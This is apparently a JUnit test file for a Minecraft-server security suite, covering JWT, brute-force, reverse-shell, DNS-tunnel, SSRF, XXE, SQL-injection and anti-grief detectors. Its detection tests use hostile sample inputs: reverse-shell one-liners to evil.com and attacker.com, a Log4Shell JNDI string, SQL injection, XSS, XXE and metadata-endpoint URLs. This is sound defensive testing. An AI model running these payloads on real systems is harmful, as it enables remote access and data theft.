package com.aluer.security;

import com.aluer.anticheat.player.AntiBotDetectionService;
import com.aluer.anticheat.world.AntiGriefDetectionService;
import com.aluer.defense.ComplianceScannerService;
import com.aluer.defense.CSPEnforcementService;
import com.aluer.defense.DataLossPreventionService;
import com.aluer.defense.DatabaseFirewallService;
import com.aluer.defense.ExploitSignatureService;
import com.aluer.defense.ForensicsCollectorService;
import com.aluer.defense.IncidentResponseService;
import com.aluer.defense.JwtAuthService;
import com.aluer.defense.MemoryProtectionService;
import com.aluer.defense.ProcessInjectionDetectionService;
import com.aluer.defense.SecureFileDeletionService;
import com.aluer.defense.SSRFProtectionService;
import com.aluer.defense.ThreatHuntingService;
import com.aluer.defense.XXEProtectionService;
import com.aluer.network.ARPSpoofDetectionService;
import com.aluer.network.BruteForceProtectionService;
import com.aluer.network.DNSTunnelDetectionService;
import com.aluer.network.ReverseShellDetectionService;
import org.junit.jupiter.api.Test;
import java.util.*;
import static org.junit.jupiter.api.Assertions.*;

class SuperEvolutionSecurityTest {

    // --- JwtAuthService Tests ---
    @Test
    void jwtTokenCreateAndValidate() {
        JwtAuthService jwt = new JwtAuthService();
        String token = jwt.createToken("admin");
        assertNotNull(token);
        assertTrue(token.contains("."));

        JwtAuthService.TokenValidationResult result = jwt.validateToken(token);
        assertTrue(result.isValid());
        assertEquals("admin", result.getSubject());
        assertEquals(1, jwt.getActiveTokenCount());
    }

    @Test
    void jwtTokenRejectsInvalidSignature() {
        JwtAuthService jwt = new JwtAuthService();
        String token = jwt.createToken("admin");
        String tampered = token.substring(0, token.length() - 4) + "XXXX";

        JwtAuthService.TokenValidationResult result = jwt.validateToken(tampered);
        assertFalse(result.isValid());
    }

    @Test
    void jwtTokenRejectsNull() {
        JwtAuthService jwt = new JwtAuthService();
        JwtAuthService.TokenValidationResult result = jwt.validateToken(null);
        assertFalse(result.isValid());
        assertEquals("Malformed token", result.getReason());
    }

    @Test
    void jwtTokenRevocation() {
        JwtAuthService jwt = new JwtAuthService();
        String token = jwt.createToken("player1");
        JwtAuthService.TokenValidationResult valid = jwt.validateToken(token);
        assertTrue(valid.isValid());

        jwt.revokeToken(valid.getJti());
        JwtAuthService.TokenValidationResult revoked = jwt.validateToken(token);
        assertFalse(revoked.isValid());
        assertEquals("Token revoked", revoked.getReason());
    }

    @Test
    void jwtTokenCleanup() {
        JwtAuthService jwt = new JwtAuthService();
        jwt.createToken("test");
        jwt.cleanupExpired();
        // Token should still be valid since it's not expired yet
        assertTrue(jwt.getActiveTokenCount() >= 1);
    }

    // --- BruteForceProtectionService Tests ---
    @Test
    void bruteForceDetectsRepeatedFailures() {
        BruteForceProtectionService bf = new BruteForceProtectionService();

        // 5 failures should trigger block
        for (int i = 0; i < 5; i++) {
            bf.recordFailedAttempt("testuser", "192.168.1.100");
        }

        BruteForceProtectionService.AuthResult result = bf.checkLoginAttempt("testuser", "192.168.1.100", "SSH");
        assertFalse(result.isAllowed());
        assertTrue(result.isBruteForceDetected());
        assertEquals(1, bf.getTrackedAccountCount());
    }

    @Test
    void bruteForceAllowsFirstAttempt() {
        BruteForceProtectionService bf = new BruteForceProtectionService();
        BruteForceProtectionService.AuthResult result = bf.checkLoginAttempt("newuser", "10.0.0.1", "WEB");
        assertTrue(result.isAllowed());
        assertTrue(result.getProgressiveDelayMs() >= 0);
    }

    @Test
    void bruteForceUnblockResetsState() {
        BruteForceProtectionService bf = new BruteForceProtectionService();
        for (int i = 0; i < 5; i++) {
            bf.recordFailedAttempt("testuser2", "192.168.1.101");
        }
        bf.checkLoginAttempt("testuser2", "192.168.1.101", "SSH");

        bf.unblock("testuser2");
        BruteForceProtectionService.AuthResult result = bf.checkLoginAttempt("testuser2", "192.168.1.101", "SSH");
        assertTrue(result.isAllowed());
    }

    // --- AntiBotDetectionService Tests ---
    @Test
    void antiBotDetectsBotNamePattern() {
        AntiBotDetectionService bot = new AntiBotDetectionService();
        AntiBotDetectionService.BotCheckResult result = bot.checkPlayerJoin("abc1234", "10.0.0.50", "vanilla");
        assertTrue(result.isSuspicious() || result.isDetected());
    }

    @Test
    void antiBotDetectsBotPrefix() {
        AntiBotDetectionService bot = new AntiBotDetectionService();
        AntiBotDetectionService.BotCheckResult result = bot.checkPlayerJoin("Bot_Attacker", "10.0.0.60", "vanilla");
        assertTrue(result.isSuspicious() || result.isDetected());
    }

    @Test
    void antiBotAllowsNormalPlayer() {
        AntiBotDetectionService bot = new AntiBotDetectionService();
        AntiBotDetectionService.BotCheckResult result = bot.checkPlayerJoin("PlayerName", "10.0.0.70", "vanilla");
        assertFalse(result.isBlocked() && result.isDetected());
    }

    @Test
    void antiBotDetectsSuspiciousClient() {
        AntiBotDetectionService bot = new AntiBotDetectionService();
        AntiBotDetectionService.BotCheckResult result = bot.checkPlayerJoin("TestPlayer", "10.0.0.80", "HackedClient_v2");
        assertTrue(result.isSuspicious() || result.isDetected());
    }

    // --- ReverseShellDetectionService Tests ---
    @Test
    void reverseShellDetectsBashTCP() {
        ReverseShellDetectionService rs = new ReverseShellDetectionService();
        ReverseShellDetectionService.DetectionResult result = rs.scanCommand(
                "bash -i >& /dev/tcp/evil.com/4444 0>&1", "attacker", "192.168.1.1");
        assertTrue(result.isThreat());
        assertEquals(ReverseShellDetectionService.ShellSeverity.CRITICAL, result.getSeverity());
    }

    @Test
    void reverseShellDetectsNetcat() {
        ReverseShellDetectionService rs = new ReverseShellDetectionService();
        ReverseShellDetectionService.DetectionResult result = rs.scanCommand(
                "nc -e /bin/bash attacker.com 1234", "attacker", "192.168.1.2");
        assertTrue(result.isThreat());
    }

    @Test
    void reverseShellAllowsSafeCommand() {
        ReverseShellDetectionService rs = new ReverseShellDetectionService();
        ReverseShellDetectionService.DetectionResult result = rs.scanCommand(
                "list players online", "admin", "127.0.0.1");
        assertFalse(result.isThreat());
    }

    // --- ARPSpoofDetectionService Tests ---
    @Test
    void arpSpoofStatusReturnsData() {
        ARPSpoofDetectionService arp = new ARPSpoofDetectionService();
        var status = arp.getStatus();
        assertNotNull(status);
        assertTrue(status.containsKey("arpCacheSize"));
        assertTrue(status.containsKey("totalSpoofDetections"));
        assertTrue(status.get("totalSpoofDetections") instanceof Long);
    }

    // --- DNSTunnelDetectionService Tests ---
    @Test
    void dnsTunnelDetectsHighEntropy() {
        DNSTunnelDetectionService dns = new DNSTunnelDetectionService();
        DNSTunnelDetectionService.TunnelCheckResult result = dns.checkDNSQuery(
                "10.0.0.1", "dGhpcyBpcyBhIHR1bm5lbCB0ZXN0LmV4YW1wbGUuY29t.xyz", "A");
        assertTrue(result.isSuspicious() || result.isDetected());
    }

    @Test
    void dnsTunnelDetectsSuspiciousTLD() {
        DNSTunnelDetectionService dns = new DNSTunnelDetectionService();
        DNSTunnelDetectionService.TunnelCheckResult result = dns.checkDNSQuery(
                "10.0.0.2", "dGhpc2lzYXR1bm5lbHRlc3RkYXRhZXhmaWx0cmF0aW9uZXhhbXBsZQ.malicious.xyz", "TXT");
        assertTrue(result.isSuspicious() || result.isDetected());
    }

    @Test
    void dnsTunnelAllowsNormalDNS() {
        DNSTunnelDetectionService dns = new DNSTunnelDetectionService();
        DNSTunnelDetectionService.TunnelCheckResult result = dns.checkDNSQuery(
                "10.0.0.3", "api.minecraft.net", "A");
        assertFalse(result.isBlocked());
    }

    // --- ExploitSignatureService Tests ---
    @Test
    void exploitSignatureDetectsLog4Shell() {
        ExploitSignatureService exploit = new ExploitSignatureService();
        ExploitSignatureService.ExploitCheckResult result = exploit.scan(
                "${jndi:ldap://evil.com/a}", "10.0.0.1", "chat-message");
        assertTrue(result.isDetected());
    }

    @Test
    void exploitSignatureDetectsSQLInjection() {
        ExploitSignatureService exploit = new ExploitSignatureService();
        ExploitSignatureService.ExploitCheckResult result = exploit.scan(
                "' OR 1=1 -- DROP TABLE users", "10.0.0.2", "api-input");
        assertTrue(result.isDetected());
    }

    @Test
    void exploitSignatureDetectsXSS() {
        ExploitSignatureService exploit = new ExploitSignatureService();
        ExploitSignatureService.ExploitCheckResult result = exploit.scan(
                "<script>alert('xss')</script>", "10.0.0.3", "user-input");
        assertTrue(result.isDetected());
    }

    @Test
    void exploitSignatureAllowsCleanInput() {
        ExploitSignatureService exploit = new ExploitSignatureService();
        ExploitSignatureService.ExploitCheckResult result = exploit.scan(
                "Hello, welcome to the server!", "10.0.0.4", "chat");
        assertFalse(result.isDetected());
    }

    @Test
    void exploitSignatureHasSignatures() {
        ExploitSignatureService exploit = new ExploitSignatureService();
        assertTrue(exploit.getSignatureCount() > 5);
    }

    // --- SSRFProtectionService Tests ---
    @Test
    void ssrfBlocksLocalhost() {
        SSRFProtectionService ssrf = new SSRFProtectionService();
        SSRFProtectionService.SSRFCheckResult result = ssrf.checkURL(
                "http://127.0.0.1/admin", "10.0.0.1");
        assertTrue(result.isBlocked());
    }

    @Test
    void ssrfBlocksMetadataEndpoint() {
        SSRFProtectionService ssrf = new SSRFProtectionService();
        SSRFProtectionService.SSRFCheckResult result = ssrf.checkURL(
                "http://169.254.169.254/latest/meta-data/", "10.0.0.2");
        assertTrue(result.isBlocked());
    }

    @Test
    void ssrfBlocksFileScheme() {
        SSRFProtectionService ssrf = new SSRFProtectionService();
        SSRFProtectionService.SSRFCheckResult result = ssrf.checkURL(
                "file:///etc/passwd", "10.0.0.3");
        assertTrue(result.isBlocked());
    }

    @Test
    void ssrfAllowsExternalURL() {
        SSRFProtectionService ssrf = new SSRFProtectionService();
        SSRFProtectionService.SSRFCheckResult result = ssrf.checkURL(
                "https://api.minecraft.net/session", "10.0.0.4");
        assertFalse(result.isBlocked());
    }

    // --- XXEProtectionService Tests ---
    @Test
    void xxeDetectsEntityDeclaration() {
        XXEProtectionService xxe = new XXEProtectionService();
        XXEProtectionService.XXECheckResult result = xxe.checkXML(
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", "10.0.0.1");
        assertTrue(result.isBlocked());
    }

    @Test
    void xxeAllowsSafeXML() {
        XXEProtectionService xxe = new XXEProtectionService();
        XXEProtectionService.XXECheckResult result = xxe.checkXML(
                "<user><name>Player</name><level>10</level></user>", "10.0.0.2");
        assertFalse(result.isBlocked());
    }

    // --- CSPEnforcementService Tests ---
    @Test
    void cspGeneratesSecurityHeaders() {
        CSPEnforcementService csp = new CSPEnforcementService();
        var headers = csp.getSecurityHeaders();
        assertTrue(headers.containsKey("X-Frame-Options"));
        assertEquals("DENY", headers.get("X-Frame-Options"));
        assertTrue(headers.containsKey("X-Content-Type-Options"));
    }

    @Test
    void cspDetectsXSSPattern() {
        CSPEnforcementService csp = new CSPEnforcementService();
        CSPEnforcementService.CSPCheckResult result = csp.checkRequest(
                "/api/comment", Map.of(), "<script>alert('xss')</script>");
        assertTrue(result.isBlocked());
    }

    // --- DatabaseFirewallService Tests ---
    @Test
    void databaseFirewallBlocksDropTable() {
        DatabaseFirewallService db = new DatabaseFirewallService();
        DatabaseFirewallService.QueryCheckResult result = db.checkQuery(
                "DROP TABLE players;", "10.0.0.1", "minecraft");
        assertTrue(result.isBlocked());
    }

    @Test
    void databaseFirewallDetectsInjection() {
        DatabaseFirewallService db = new DatabaseFirewallService();
        DatabaseFirewallService.QueryCheckResult result = db.checkQuery(
                "SELECT * FROM users WHERE id = 1 OR 1=1 -- ", "10.0.0.2", "minecraft");
        assertTrue(result.isBlocked());
    }

    @Test
    void databaseFirewallAllowsSafeQuery() {
        DatabaseFirewallService db = new DatabaseFirewallService();
        DatabaseFirewallService.QueryCheckResult result = db.checkQuery(
                "SELECT name, level FROM players WHERE online = 1", "127.0.0.1", "minecraft");
        assertFalse(result.isBlocked());
    }

    // --- DataLossPreventionService Tests ---
    @Test
    void dlpDetectsEmailLeak() {
        DataLossPreventionService dlp = new DataLossPreventionService();
        DataLossPreventionService.DLPCheckResult result = dlp.scan(
                "My email is admin@example.com", "chat", "minecraft-chat");
        assertTrue(result.isDetected());
    }

    @Test
    void dlpDetectsAPIKeyLeak() {
        DataLossPreventionService dlp = new DataLossPreventionService();
        DataLossPreventionService.DLPCheckResult result = dlp.scan(
                "api_key=sk-proj-1234567890abcdefghij", "log", "server-console");
        assertTrue(result.isDetected());
    }

    @Test
    void dlpDetectsPasswordLeak() {
        DataLossPreventionService dlp = new DataLossPreventionService();
        DataLossPreventionService.DLPCheckResult result = dlp.scan(
                "password=MySecretPassword123", "config", "file-content");
        assertTrue(result.isDetected());
    }

    @Test
    void dlpRedactsSensitiveData() {
        DataLossPreventionService dlp = new DataLossPreventionService();
        String redacted = dlp.redactSensitiveData("Contact admin@example.com for help");
        assertFalse(redacted.contains("admin@example.com"));
        assertTrue(redacted.contains("REDACTED"));
    }

    // --- MemoryProtectionService Tests ---
    @Test
    void memoryProtectionChecksHeap() {
        MemoryProtectionService mem = new MemoryProtectionService();
        MemoryProtectionService.MemoryCheckResult result = mem.checkMemory();
        assertTrue(result.getHeapRatio() >= 0);
        assertTrue(result.getHeapUsedMB() > 0);
        assertTrue(result.getHeapMaxMB() > 0);
    }

    @Test
    void memoryProtectionStatusReturnsData() {
        MemoryProtectionService mem = new MemoryProtectionService();
        var status = mem.getStatus();
        assertTrue(status.containsKey("heapUsedMB"));
        assertTrue(status.containsKey("heapMaxMB"));
        assertTrue(status.containsKey("heapRatio"));
    }

    // --- ProcessInjectionDetectionService Tests ---
    @Test
    void processInjectionScanRuns() {
        ProcessInjectionDetectionService pid = new ProcessInjectionDetectionService();
        ProcessInjectionDetectionService.InjectionCheckResult result = pid.scanProcesses();
        assertNotNull(result);
        assertTrue(result.getProcessCount() >= 0);
    }

    // --- SecureFileDeletionService Tests ---
    @Test
    void secureDeletionFileNotFound() {
        SecureFileDeletionService sfd = new SecureFileDeletionService();
        SecureFileDeletionService.DeletionResult result = sfd.secureDelete("/nonexistent/file.txt");
        assertFalse(result.isSuccess());
        assertNotNull(result.getError());
    }

    // --- ForensicsCollectorService Tests ---
    @Test
    void forensicsOpenAndCloseCase() {
        ForensicsCollectorService forensics = new ForensicsCollectorService();
        ForensicsCollectorService.ForensicsCase fCase = forensics.openCase(
                "Test Incident", "Security test", "admin");
        assertNotNull(fCase);
        assertNotNull(fCase.caseId);
        assertTrue(fCase.caseId.startsWith("CASE-"));

        var evidence = forensics.collectTimestampSnapshot(fCase.caseId);
        assertNotNull(evidence);
        assertEquals("TIMESTAMP_SNAPSHOT", evidence.type);

        ForensicsCollectorService.ForensicsCase closed = forensics.closeCase(
                fCase.caseId, "Test completed successfully", "admin");
        assertTrue(closed.closed);
    }

    // --- IncidentResponseService Tests ---
    @Test
    void incidentResponseDeclaresDDoS() {
        IncidentResponseService ir = new IncidentResponseService();
        IncidentResponseService.Incident incident = ir.declareIncident(
                "DDOS_ATTACK", "SYN flood detected on port 25565", "10.0.0.1",
                IncidentResponseService.IncidentSeverity.CRITICAL);
        assertNotNull(incident);
        assertNotNull(incident.incidentId);
        assertEquals("DDOS_ATTACK", incident.type);
        assertEquals(1, ir.getTotalIncidents());
    }

    @Test
    void incidentResponseResolvesIncident() {
        IncidentResponseService ir = new IncidentResponseService();
        IncidentResponseService.Incident incident = ir.declareIncident(
                "BRUTE_FORCE", "Login brute force", "10.0.0.2",
                IncidentResponseService.IncidentSeverity.HIGH);
        IncidentResponseService.Incident resolved = ir.resolveIncident(
                incident.incidentId, "Blocked source IP");
        assertNotNull(resolved);
        assertTrue(resolved.resolved);
    }

    // --- ThreatHuntingService Tests ---
    @Test
    void threatHuntingRunsHunt() {
        ThreatHuntingService th = new ThreatHuntingService();
        ThreatHuntingService.HuntResult result = th.runHunt(
                "UNUSUAL_LOGIN_TIMES", List.of("Player joined the game at 03:00 AM"));
        assertNotNull(result);
        assertEquals("UNUSUAL_LOGIN_TIMES", result.huntId);
    }

    // --- ComplianceScannerService Tests ---
    @Test
    void complianceScannerRunsScan() {
        ComplianceScannerService cs = new ComplianceScannerService();
        ComplianceScannerService.ComplianceReport report = cs.runComplianceScan();
        assertNotNull(report);
        assertTrue(report.findings.size() > 0);
        assertTrue(report.complianceScore >= 0 && report.complianceScore <= 100);
    }

    // --- AntiGriefDetectionService Tests ---
    @Test
    void antiGriefDetectsRapidBlockBreak() {
        AntiGriefDetectionService ag = new AntiGriefDetectionService();
        // Simulate many blocks broken rapidly
        for (int i = 0; i < 151; i++) {
            ag.checkBlockBreak("Griefer1", "STONE", i, 64, i, "world");
        }
        var status = ag.getStatus();
        assertTrue((Long) status.get("totalGriefDetections") > 0);
    }

    @Test
    void antiGriefDetectsTNTPlacement() {
        AntiGriefDetectionService ag = new AntiGriefDetectionService();
        AntiGriefDetectionService.GriefCheckResult result = ag.checkBlockPlace(
                "Griefer2", "TNT", 100, 64, 100, "world");
        assertTrue(result.isSuspicious() || result.isFlagged());
    }

    @Test
    void antiGriefAllowsNormalPlay() {
        AntiGriefDetectionService ag = new AntiGriefDetectionService();
        AntiGriefDetectionService.GriefCheckResult result = ag.checkBlockBreak(
                "GoodPlayer", "STONE", 10, 64, 10, "world");
        assertFalse(result.isFlagged());
    }

    @Test
    void antiGriefClearPlayerResets() {
        AntiGriefDetectionService ag = new AntiGriefDetectionService();
        for (int i = 0; i < 151; i++) {
            ag.checkBlockBreak("TempGriefer", "STONE", i, 64, i, "world");
        }
        ag.clearPlayer("TempGriefer");
        AntiGriefDetectionService.GriefCheckResult result = ag.checkBlockBreak(
                "TempGriefer", "STONE", 0, 64, 0, "world");
        assertFalse(result.isFlagged());
    }
}
